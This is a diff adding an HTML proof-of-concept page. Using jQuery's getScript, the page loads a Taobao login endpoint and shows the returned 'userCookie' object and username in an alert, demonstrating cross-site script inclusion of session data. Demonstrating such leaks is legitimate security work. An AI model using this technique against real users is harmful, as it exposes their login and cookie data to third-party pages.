@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="Generator" content="EditPlus®">
+  <meta name="Author" content="">
+  <meta name="Keywords" content="">
+  <meta name="Description" content="">
+  <title>Document</title>
+ </head>
+ <body>
+ <script type="text/javascript">
+  TB={
+    Global:{run:function(){
+         // alert(userCookie);
+    }}
+  };
+  TB.Global && TB.Global.run && TB.Global.run();
+ </script>
+ <script type="text/javascript" src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
+ <script type="text/javascript" >
+$.getScript('http://www.taobao.com/go/app/tmall/login-api.php?0.7708313883788565', function(){  
+    alert("the taobao.com cookie object:" + JSON.stringify(userCookie) + " username:" + userCookie._nk_);  
+});  
+ </script>
+
+ 
+ </body>
+</html>
